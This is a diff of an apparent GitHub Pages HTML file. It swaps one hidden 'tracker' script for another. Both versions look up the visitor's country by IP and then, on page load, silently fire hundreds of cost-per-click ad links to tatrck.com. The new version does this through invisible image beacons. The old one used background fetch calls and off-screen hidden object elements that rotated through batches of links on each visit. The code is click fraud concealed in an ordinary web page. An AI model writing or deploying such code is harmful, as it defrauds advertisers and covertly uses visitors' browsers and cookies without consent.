@@ -3470,19 +3470,19 @@ document.addEventListener("DOMContentLoaded", function() {
 
 
 <!-- ========================================== -->
-<!-- TRACKER LÉGER (FETCH API)                  -->
-<!-- Aucun iframe, aucun objet, aucun popup     -->
-<!-- Déclenche TOUS les liens du pays en fond   -->
+<!-- TAKEADS CLICK TRACKER (IMAGE BEACON)       -->
+<!-- Triggers a real resource load to count click -->
 <!-- ========================================== -->
 <script>
 document.addEventListener("DOMContentLoaded", function() {
 
-    // --- 1. VÉRIFICATION DU DOMAINE ---
+    // --- 1. DOMAIN CHECK (adjust if needed) ---
     if (window.location.hostname !== 'boussedraoui.github.io') {
+        console.log('[Tracker] Wrong domain. Tracker disabled.');
         return; 
     }
 
-    // --- 2. TOUS LES LIENS PAR PAYS ---
+    // --- 2. ALL LINKS BY COUNTRY ---
     const linksByCountry = {
         US: [
             "https://tatrck.com/h/0Hu30_aa0SGv?model=cpc", "https://tatrck.com/h/0Hu30_aa0VVd?model=cpc", "https://tatrck.com/h/0Hu30_aa0X7f?model=cpc", "https://tatrck.com/h/0Hu30_aa0bIR?model=cpc",
@@ -3580,205 +3580,17 @@ document.addEventListener("DOMContentLoaded", function() {
         ]
     };
 
-    // --- 3. DÉTECTION IP ET CHARGEMENT DE TOUS LES LIENS ---
-    fetch('https://ipapi.co/json/')
-        .then(response => response.json())
-        .then(data => {
-            const country = data.country_code;
-            const links = linksByCountry[country];
-            
-            if (!links) {
-                console.log('[Tracker] Pays non supporté : ' + country);
-                return;
-            }
-
-            console.log('[Tracker] Démarrage de ' + links.length + ' liens pour ' + country + '...');
-
-            // Boucle sur TOUS les liens du pays
-            links.forEach((link, i) => {
-                // 200ms de délai entre chaque requête pour ne pas surcharger le navigateur
-                setTimeout(() => {
-                    fetch(link, {
-                        mode: 'no-cors', // Permet d'envoyer la requête vers tatrck.com sans erreur CORS
-                        cache: 'no-store' // Force la requête à ne pas être mise en cache
-                    })
-                    .then(() => console.log('[Tracker] Lien ' + (i + 1) + '/' + links.length + ' compté.'))
-                    .catch(() => {}); // On ignore les erreurs
-                }, i * 200); 
-            });
-        })
-        .catch(error => {
-            console.log('[Tracker] Échec de la détection IP.');
-        });
-});
-</script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-<!-- ========================================== -->
-<!-- HIDDEN TRACKER (IP-BASED)                  -->
-<!-- US → 3 liens, BR → 3 liens, DE → 3 liens   -->
-<!-- 100% invisible, aucun popup, aucun blocage -->
-<!-- ========================================== -->
-<script>
-document.addEventListener("DOMContentLoaded", function() {
-
-    // --- 1. VÉRIFICATION DU DOMAINE ---
-    if (window.location.hostname !== 'boussedraoui.github.io') {
-        return; 
-    }
-
-    // --- 2. TOUS LES LIENS PAR PAYS ---
-    const linksByCountry = {
-        US: [
-            "https://tatrck.com/h/0Hu30_aa0SGv?model=cpc", "https://tatrck.com/h/0Hu30_aa0VVd?model=cpc", "https://tatrck.com/h/0Hu30_aa0X7f?model=cpc", "https://tatrck.com/h/0Hu30_aa0bIR?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0eQB?model=cpc", "https://tatrck.com/h/0Hu30_aa0gfz?model=cpc", "https://tatrck.com/h/0Hu30_aa0hYT?model=cpc", "https://tatrck.com/h/0Hu30_aa0iAr?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0kFQ?model=cpc", "https://tatrck.com/h/0Hu30_aa0tzY?model=cpc", "https://tatrck.com/h/0Hu30_aa0OU9?model=cpc", "https://tatrck.com/h/0Hu30_aa0OYa?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0ObY?model=cpc", "https://tatrck.com/h/0Hu30_aa0PIJ?model=cpc", "https://tatrck.com/h/0Hu30_aa0PKr?model=cpc", "https://tatrck.com/h/0Hu30_aa0PNP?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0PNx?model=cpc", "https://tatrck.com/h/0Hu30_aa0PSe?model=cpc", "https://tatrck.com/h/0Hu30_aa0PU0?model=cpc", "https://tatrck.com/h/0Hu30_aa0PVN?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0PqV?model=cpc", "https://tatrck.com/h/0Hu30_aa0Pv9?model=cpc", "https://tatrck.com/h/0Hu30_aa0QBJ?model=cpc", "https://tatrck.com/h/0Hu30_aa0QZP?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0R4e?model=cpc", "https://tatrck.com/h/0Hu30_aa0R5Y?model=cpc", "https://tatrck.com/h/0Hu30_aa0R6F?model=cpc", "https://tatrck.com/h/0Hu30_aa0R9u?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0RBn?model=cpc", "https://tatrck.com/h/0Hu30_aa0RC7?model=cpc", "https://tatrck.com/h/0Hu30_aa0RKV?model=cpc", "https://tatrck.com/h/0Hu30_aa0RRb?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0RWE?model=cpc", "https://tatrck.com/h/0Hu30_aa0RWT?model=cpc", "https://tatrck.com/h/0Hu30_aa0RiT?model=cpc", "https://tatrck.com/h/0Hu30_aa0Rjz?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0RoT?model=cpc", "https://tatrck.com/h/0Hu30_aa0RwR?model=cpc", "https://tatrck.com/h/0Hu30_aa0RwV?model=cpc", "https://tatrck.com/h/0Hu30_aa0S2X?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0S5Q?model=cpc", "https://tatrck.com/h/0Hu30_aa0SGF?model=cpc", "https://tatrck.com/h/0Hu30_aa0SGv?model=cpc", "https://tatrck.com/h/0Hu30_aa0SU1?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0SWP?model=cpc", "https://tatrck.com/h/0Hu30_aa0SXI?model=cpc", "https://tatrck.com/h/0Hu30_aa0Sdi?model=cpc", "https://tatrck.com/h/0Hu30_aa0SfS?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0SiW?model=cpc", "https://tatrck.com/h/0Hu30_aa0SjM?model=cpc", "https://tatrck.com/h/0Hu30_aa0SpK?model=cpc", "https://tatrck.com/h/0Hu30_aa0SsD?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0SsK?model=cpc", "https://tatrck.com/h/0Hu30_aa0Su9?model=cpc", "https://tatrck.com/h/0Hu30_aa0Sv6?model=cpc", "https://tatrck.com/h/0Hu30_aa0SwZ?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0SyU?model=cpc", "https://tatrck.com/h/0Hu30_aa0Syk?model=cpc", "https://tatrck.com/h/0Hu30_aa0T05?model=cpc", "https://tatrck.com/h/0Hu30_aa0TAp?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0ToO?model=cpc", "https://tatrck.com/h/0Hu30_aa0UJ9?model=cpc", "https://tatrck.com/h/0Hu30_aa0UMz?model=cpc", "https://tatrck.com/h/0Hu30_aa0UNv?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0Us7?model=cpc", "https://tatrck.com/h/0Hu30_aa0UxO?model=cpc", "https://tatrck.com/h/0Hu30_aa0V8Z?model=cpc", "https://tatrck.com/h/0Hu30_aa0V9v?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0VDy?model=cpc", "https://tatrck.com/h/0Hu30_aa0VZg?model=cpc", "https://tatrck.com/h/0Hu30_aa0Vg6?model=cpc", "https://tatrck.com/h/0Hu30_aa0W19?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0W60?model=cpc", "https://tatrck.com/h/0Hu30_aa0WFh?model=cpc", "https://tatrck.com/h/0Hu30_aa0WJE?model=cpc", "https://tatrck.com/h/0Hu30_aa0WKY?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0WVy?model=cpc", "https://tatrck.com/h/0Hu30_aa0Wtn?model=cpc", "https://tatrck.com/h/0Hu30_aa0WvS?model=cpc", "https://tatrck.com/h/0Hu30_aa0X0H?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0X3c?model=cpc", "https://tatrck.com/h/0Hu30_aa0X6x?model=cpc", "https://tatrck.com/h/0Hu30_aa0XJk?model=cpc", "https://tatrck.com/h/0Hu30_aa0XKF?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0XPL?model=cpc", "https://tatrck.com/h/0Hu30_aa0XQo?model=cpc", "https://tatrck.com/h/0Hu30_aa0XRX?model=cpc", "https://tatrck.com/h/0Hu30_aa0Xb1?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0Xgx?model=cpc", "https://tatrck.com/h/0Hu30_aa0XhW?model=cpc", "https://tatrck.com/h/0Hu30_aa0XjN?model=cpc", "https://tatrck.com/h/0Hu30_aa0Xn4?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0Y09?model=cpc", "https://tatrck.com/h/0Hu30_aa0YBf?model=cpc", "https://tatrck.com/h/0Hu30_aa0YGY?model=cpc", "https://tatrck.com/h/0Hu30_aa0YHb?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0YNm?model=cpc", "https://tatrck.com/h/0Hu30_aa0YN_?model=cpc", "https://tatrck.com/h/0Hu30_aa0YnL?model=cpc", "https://tatrck.com/h/0Hu30_aa0Yo_?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0ZEJ?model=cpc", "https://tatrck.com/h/0Hu30_aa0ZLQ?model=cpc", "https://tatrck.com/h/0Hu30_aa0ZMM?model=cpc", "https://tatrck.com/h/0Hu30_aa0ZNI?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0ZRT?model=cpc", "https://tatrck.com/h/0Hu30_aa0ZdR?model=cpc", "https://tatrck.com/h/0Hu30_aa0ZvL?model=cpc", "https://tatrck.com/h/0Hu30_aa0a1S?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0a7S?model=cpc", "https://tatrck.com/h/0Hu30_aa0a9U?model=cpc", "https://tatrck.com/h/0Hu30_aa0aGN?model=cpc", "https://tatrck.com/h/0Hu30_aa0aJW?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0aPZ?model=cpc", "https://tatrck.com/h/0Hu30_aa0aQX?model=cpc", "https://tatrck.com/h/0Hu30_aa0aSm?model=cpc", "https://tatrck.com/h/0Hu30_aa0aZn?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0aen?model=cpc", "https://tatrck.com/h/0Hu30_aa0ani?model=cpc", "https://tatrck.com/h/0Hu30_aa0avi?model=cpc", "https://tatrck.com/h/0Hu30_aa0a-f?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0b2z?model=cpc", "https://tatrck.com/h/0Hu30_aa0b36?model=cpc", "https://tatrck.com/h/0Hu30_aa0b76?model=cpc", "https://tatrck.com/h/0Hu30_aa0bGP?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0bPW?model=cpc", "https://tatrck.com/h/0Hu30_aa0bQM?model=cpc", "https://tatrck.com/h/0Hu30_aa0bUc?model=cpc", "https://tatrck.com/h/0Hu30_aa0bak?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0bgZ?model=cpc", "https://tatrck.com/h/0Hu30_aa0brx?model=cpc", "https://tatrck.com/h/0Hu30_aa0bzl?model=cpc", "https://tatrck.com/h/0Hu30_aa0b-P?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0cMr?model=cpc", "https://tatrck.com/h/0Hu30_aa0cj2?model=cpc", "https://tatrck.com/h/0Hu30_aa0cjB?model=cpc", "https://tatrck.com/h/0Hu30_aa0ckE?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0d32?model=cpc", "https://tatrck.com/h/0Hu30_aa0d7K?model=cpc", "https://tatrck.com/h/0Hu30_aa0d9H?model=cpc", "https://tatrck.com/h/0Hu30_aa0dGO?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0dKN?model=cpc", "https://tatrck.com/h/0Hu30_aa0dRl?model=cpc", "https://tatrck.com/h/0Hu30_aa0dT6?model=cpc", "https://tatrck.com/h/0Hu30_aa0dTr?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0dbj?model=cpc", "https://tatrck.com/h/0Hu30_aa0deg?model=cpc", "https://tatrck.com/h/0Hu30_aa0di3?model=cpc", "https://tatrck.com/h/0Hu30_aa0diP?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0djg?model=cpc", "https://tatrck.com/h/0Hu30_aa0dmd?model=cpc", "https://tatrck.com/h/0Hu30_aa0doT?model=cpc", "https://tatrck.com/h/0Hu30_aa0dp3?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0drn?model=cpc", "https://tatrck.com/h/0Hu30_aa0duF?model=cpc", "https://tatrck.com/h/0Hu30_aa0d-J?model=cpc", "https://tatrck.com/h/0Hu30_aa0e2F?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0eF0?model=cpc", "https://tatrck.com/h/0Hu30_aa0eIK?model=cpc", "https://tatrck.com/h/0Hu30_aa0eIZ?model=cpc", "https://tatrck.com/h/0Hu30_aa0eLq?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0eNC?model=cpc", "https://tatrck.com/h/0Hu30_aa0eQB?model=cpc", "https://tatrck.com/h/0Hu30_aa0eQe?model=cpc", "https://tatrck.com/h/0Hu30_aa0eW5?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0ece?model=cpc", "https://tatrck.com/h/0Hu30_aa0eiw?model=cpc", "https://tatrck.com/h/0Hu30_aa0etG?model=cpc", "https://tatrck.com/h/0Hu30_aa0eyC?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0f5V?model=cpc", "https://tatrck.com/h/0Hu30_aa0fDd?model=cpc", "https://tatrck.com/h/0Hu30_aa0fEo?model=cpc", "https://tatrck.com/h/0Hu30_aa0fhi?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0foS?model=cpc", "https://tatrck.com/h/0Hu30_aa0g3_?model=cpc", "https://tatrck.com/h/0Hu30_aa0gOB?model=cpc", "https://tatrck.com/h/0Hu30_aa0gQY?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0gTA?model=cpc", "https://tatrck.com/h/0Hu30_aa0gbN?model=cpc", "https://tatrck.com/h/0Hu30_aa0gcm?model=cpc", "https://tatrck.com/h/0Hu30_aa0gfz?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0gkJ?model=cpc", "https://tatrck.com/h/0Hu30_aa0gvs?model=cpc", "https://tatrck.com/h/0Hu30_aa0gwJ?model=cpc", "https://tatrck.com/h/0Hu30_aa0gxw?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0gz9?model=cpc", "https://tatrck.com/h/0Hu30_aa0h1C?model=cpc", "https://tatrck.com/h/0Hu30_aa0h3t?model=cpc", "https://tatrck.com/h/0Hu30_aa0hAT?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0hHR?model=cpc", "https://tatrck.com/h/0Hu30_aa0iAr?model=cpc", "https://tatrck.com/h/0Hu30_aa0iMZ?model=cpc", "https://tatrck.com/h/0Hu30_aa0iP0?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0iY9?model=cpc", "https://tatrck.com/h/0Hu30_aa0ia5?model=cpc", "https://tatrck.com/h/0Hu30_aa0ipS?model=cpc", "https://tatrck.com/h/0Hu30_aa0iyQ?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0i-C?model=cpc", "https://tatrck.com/h/0Hu30_aa0i_h?model=cpc", "https://tatrck.com/h/0Hu30_aa0j1B?model=cpc", "https://tatrck.com/h/0Hu30_aa0j3b?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0jD5?model=cpc", "https://tatrck.com/h/0Hu30_aa0jFT?model=cpc", "https://tatrck.com/h/0Hu30_aa0jVQ?model=cpc", "https://tatrck.com/h/0Hu30_aa0je1?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0jep?model=cpc", "https://tatrck.com/h/0Hu30_aa0jsm?model=cpc", "https://tatrck.com/h/0Hu30_aa0jxx?model=cpc", "https://tatrck.com/h/0Hu30_aa0jyA?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0kFK?model=cpc", "https://tatrck.com/h/0Hu30_aa0kFQ?model=cpc", "https://tatrck.com/h/0Hu30_aa0kIj?model=cpc", "https://tatrck.com/h/0Hu30_aa0kJJ?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0kNC?model=cpc", "https://tatrck.com/h/0Hu30_aa0kWd?model=cpc", "https://tatrck.com/h/0Hu30_aa0kZn?model=cpc", "https://tatrck.com/h/0Hu30_aa0kfs?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0ktR?model=cpc", "https://tatrck.com/h/0Hu30_aa0l4U?model=cpc", "https://tatrck.com/h/0Hu30_aa0l59?model=cpc", "https://tatrck.com/h/0Hu30_aa0l7R?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0l9E?model=cpc", "https://tatrck.com/h/0Hu30_aa0lHX?model=cpc", "https://tatrck.com/h/0Hu30_aa0lPE?model=cpc", "https://tatrck.com/h/0Hu30_aa0lbN?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0li2?model=cpc", "https://tatrck.com/h/0Hu30_aa0m2Z?model=cpc", "https://tatrck.com/h/0Hu30_aa0ma1?model=cpc", "https://tatrck.com/h/0Hu30_aa0nmr?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0npE?model=cpc", "https://tatrck.com/h/0Hu30_aa0npx?model=cpc", "https://tatrck.com/h/0Hu30_aa0oVc?model=cpc", "https://tatrck.com/h/0Hu30_aa0obj?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0oux?model=cpc", "https://tatrck.com/h/0Hu30_aa0pQ2?model=cpc", "https://tatrck.com/h/0Hu30_aa0pgK?model=cpc", "https://tatrck.com/h/0Hu30_aa0pgL?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0pgX?model=cpc", "https://tatrck.com/h/0Hu30_aa0p__?model=cpc", "https://tatrck.com/h/0Hu30_aa0qKf?model=cpc", "https://tatrck.com/h/0Hu30_aa0qNo?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0qO8?model=cpc", "https://tatrck.com/h/0Hu30_aa0r1K?model=cpc", "https://tatrck.com/h/0Hu30_aa0r3p?model=cpc", "https://tatrck.com/h/0Hu30_aa0r4g?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0ra7?model=cpc", "https://tatrck.com/h/0Hu30_aa0rhu?model=cpc", "https://tatrck.com/h/0Hu30_aa0s2D?model=cpc", "https://tatrck.com/h/0Hu30_aa0sAQ?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0sLF?model=cpc", "https://tatrck.com/h/0Hu30_aa0sQE?model=cpc", "https://tatrck.com/h/0Hu30_aa0sZK?model=cpc", "https://tatrck.com/h/0Hu30_aa0sZi?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0skI?model=cpc", "https://tatrck.com/h/0Hu30_aa0ssJ?model=cpc", "https://tatrck.com/h/0Hu30_aa0swk?model=cpc", "https://tatrck.com/h/0Hu30_aa0t0g?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0tBe?model=cpc", "https://tatrck.com/h/0Hu30_aa0tII?model=cpc", "https://tatrck.com/h/0Hu30_aa0tX9?model=cpc", "https://tatrck.com/h/0Hu30_aa0tXO?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0tYo?model=cpc", "https://tatrck.com/h/0Hu30_aa0tio?model=cpc", "https://tatrck.com/h/0Hu30_aa0toV?model=cpc", "https://tatrck.com/h/0Hu30_aa0tpG?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0u5N?model=cpc", "https://tatrck.com/h/0Hu30_aa0u5z?model=cpc", "https://tatrck.com/h/0Hu30_aa0u7Z?model=cpc", "https://tatrck.com/h/0Hu30_aa0u7Z?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0uAM?model=cpc"
-        ],
-        BR: [
-            "https://tatrck.com/h/0Hu30_aa0XTq?model=cpc", "https://tatrck.com/h/0Hu30_aa0RRb?model=cpc", "https://tatrck.com/h/0Hu30_aa0Rjz?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0XTq?model=cpc", "https://tatrck.com/h/0Hu30_aa0ZH4?model=cpc", "https://tatrck.com/h/0Hu30_aa0aic?model=cpc"
-        ],
-        DE: [
-            "https://tatrck.com/h/0Hu30_aa0P1g?model=cpc", "https://tatrck.com/h/0Hu30_aa0Wxz?model=cpc", "https://tatrck.com/h/0Hu30_aa0YQj?model=cpc", "https://tatrck.com/h/0Hu30_aa0iAr?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0OU9?model=cpc", "https://tatrck.com/h/0Hu30_aa0OW9?model=cpc", "https://tatrck.com/h/0Hu30_aa0P9k?model=cpc", "https://tatrck.com/h/0Hu30_aa0PEP?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0PNP?model=cpc", "https://tatrck.com/h/0Hu30_aa0PQo?model=cpc", "https://tatrck.com/h/0Hu30_aa0Q80?model=cpc", "https://tatrck.com/h/0Hu30_aa0Q8Q?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0R75?model=cpc", "https://tatrck.com/h/0Hu30_aa0RhC?model=cpc", "https://tatrck.com/h/0Hu30_aa0RiT?model=cpc", "https://tatrck.com/h/0Hu30_aa0Rjz?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0RwV?model=cpc", "https://tatrck.com/h/0Hu30_aa0S79?model=cpc", "https://tatrck.com/h/0Hu30_aa0SiW?model=cpc", "https://tatrck.com/h/0Hu30_aa0Su9?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0UtQ?model=cpc", "https://tatrck.com/h/0Hu30_aa0UtQ?model=cpc", "https://tatrck.com/h/0Hu30_aa0Utt?model=cpc", "https://tatrck.com/h/0Hu30_aa0UuQ?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0V4s?model=cpc", "https://tatrck.com/h/0Hu30_aa0V9v?model=cpc", "https://tatrck.com/h/0Hu30_aa0VGN?model=cpc", "https://tatrck.com/h/0Hu30_aa0VZg?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0V-X?model=cpc", "https://tatrck.com/h/0Hu30_aa0W19?model=cpc", "https://tatrck.com/h/0Hu30_aa0Wmh?model=cpc", "https://tatrck.com/h/0Hu30_aa0WoO?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0Xgx?model=cpc", "https://tatrck.com/h/0Hu30_aa0Xre?model=cpc", "https://tatrck.com/h/0Hu30_aa0YGY?model=cpc", "https://tatrck.com/h/0Hu30_aa0YQj?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0YbX?model=cpc", "https://tatrck.com/h/0Hu30_aa0Yo_?model=cpc", "https://tatrck.com/h/0Hu30_aa0YrX?model=cpc", "https://tatrck.com/h/0Hu30_aa0a9U?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0aZn?model=cpc", "https://tatrck.com/h/0Hu30_aa0bgZ?model=cpc", "https://tatrck.com/h/0Hu30_aa0cF0?model=cpc", "https://tatrck.com/h/0Hu30_aa0cPw?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0cs2?model=cpc", "https://tatrck.com/h/0Hu30_aa0di3?model=cpc", "https://tatrck.com/h/0Hu30_aa0doT?model=cpc", "https://tatrck.com/h/0Hu30_aa0dp3?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0eDH?model=cpc", "https://tatrck.com/h/0Hu30_aa0ece?model=cpc", "https://tatrck.com/h/0Hu30_aa0fg6?model=cpc", "https://tatrck.com/h/0Hu30_aa0hng?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0iAr?model=cpc", "https://tatrck.com/h/0Hu30_aa0i-C?model=cpc", "https://tatrck.com/h/0Hu30_aa0j3b?model=cpc", "https://tatrck.com/h/0Hu30_aa0jAp?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0jKg?model=cpc", "https://tatrck.com/h/0Hu30_aa0jxx?model=cpc", "https://tatrck.com/h/0Hu30_aa0kAd?model=cpc", "https://tatrck.com/h/0Hu30_aa0kJJ?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0lSG?model=cpc", "https://tatrck.com/h/0Hu30_aa0nAp?model=cpc", "https://tatrck.com/h/0Hu30_aa0npx?model=cpc", "https://tatrck.com/h/0Hu30_aa0o9l?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0ov8?model=cpc", "https://tatrck.com/h/0Hu30_aa0pQ2?model=cpc", "https://tatrck.com/h/0Hu30_aa0q9g?model=cpc", "https://tatrck.com/h/0Hu30_aa0qFc?model=cpc",
-            "https://tatrck.com/h/0Hu30_aa0qO8?model=cpc", "https://tatrck.com/h/0Hu30_aa0qfp?model=cpc", "https://tatrck.com/h/0Hu30_aa0t0g?model=cpc", "https://tatrck.com/h/0Hu30_aa0u5T?model=cpc"
-        ]
-    };
-
-    // --- 3. FONCTION POUR CACHER LES LIENS ---
-    function loadHiddenObject(url) {
+    // --- 3. IMAGE BEACON FUNCTION ---
+    function triggerClickTracker(url) {
         if (!url) return;
-        const obj = document.createElement('object');
-        obj.setAttribute('data', url);
-        obj.setAttribute('type', 'text/html');
-        
-        // Paramètres pour cacher complètement l'élément
-        obj.style.position = 'absolute';
-        obj.style.left = '-9999px'; // En dehors de l'écran
-        obj.style.top = '0';
-        obj.style.width = '1px';
-        obj.style.height = '1px';
-        obj.style.opacity = '0';    // Invisible
-        obj.style.pointerEvents = 'none'; // L'utilisateur ne peut pas cliquer dessus
-        obj.style.border = 'none';
-        
-        document.body.appendChild(obj);
+        const img = new Image();
+        img.src = url;
+        // The image does not need to be added to the DOM. 
+        // The browser will still make the request, follow redirects, 
+        // and set the necessary cookies on the tracking domain.
     }
 
-    // --- 4. ROTATION : 3 LIENS DIFFÉRENTS À CHAQUE VISITE ---
-    function getNextBatch(key, links, batchSize) {
-        const len = links.length;
-        let start = 0;
-        try {
-            start = parseInt(localStorage.getItem(key), 10);
-            if (isNaN(start) || start < 0) start = 0;
-        } catch (e) { start = 0; }
-        start = start % len;
-
-        const batch = [];
-        for (let i = 0; i < batchSize; i++) {
-            batch.push(links[(start + i) % len]);
-        }
-
-        // Sauvegarde la position pour la prochaine visite
-        const next = (start + batchSize) % len;
-        try { localStorage.setItem(key, String(next)); } catch (e) {}
-
-        return batch;
-    }
-
-    // --- 5. DÉTECTION IP ET CHARGEMENT EN ARRIÈRE-PLAN ---
+    // --- 4. IP DETECTION AND BATCH PROCESSING ---
     fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
@@ -3786,22 +3598,21 @@ document.addEventListener("DOMContentLoaded", function() {
             const links = linksByCountry[country];
             
             if (!links) {
-                console.log('[Tracker] Pays non supporté : ' + country);
+                console.log('[Tracker] Country not supported: ' + country);
                 return;
             }
 
-            const storageKey = 'hidden_obj_visit_index_' + country;
-            const batch = getNextBatch(storageKey, links, 3);
+            console.log('[Tracker] Starting ' + links.length + ' trackers for ' + country + '...');
 
-            // Charge les 3 liens en arrière-plan, espacés d'1 seconde
-            batch.forEach((link, i) => {
+            // Process each link with a small delay to avoid overwhelming the browser
+            links.forEach((link, i) => {
                 setTimeout(() => {
-                    loadHiddenObject(link);
-                }, i * 1000);
+                    triggerClickTracker(link);
+                }, i * 150); // 150ms between each trigger
             });
         })
         .catch(error => {
-            console.log('[Tracker] Échec de la détection IP.');
+            console.log('[Tracker] IP detection failed.');
         });
 });
 </script>
